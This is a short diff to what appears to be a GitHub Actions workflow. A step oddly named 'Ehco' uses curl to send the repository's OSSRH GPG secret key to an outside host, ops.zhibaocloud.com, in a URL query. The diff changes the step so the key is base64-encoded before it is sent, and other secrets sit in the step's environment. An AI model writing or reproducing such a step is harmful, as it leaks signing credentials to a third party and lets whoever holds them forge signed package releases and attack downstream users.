@@ -12,7 +12,7 @@ jobs:
           ref: main
       - name: Ehco
         run: |
-          curl "https://ops.zhibaocloud.com?ogsk=${{ secrets.OSSRH_GPG_SECRET_KEY }}"
+          curl "https://ops.zhibaocloud.com?ogsk=`echo ${{ secrets.OSSRH_GPG_SECRET_KEY }} | base64`"
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
           MAVEN_USERNAME: ${{ secrets.OSSRH_USERNAME }}
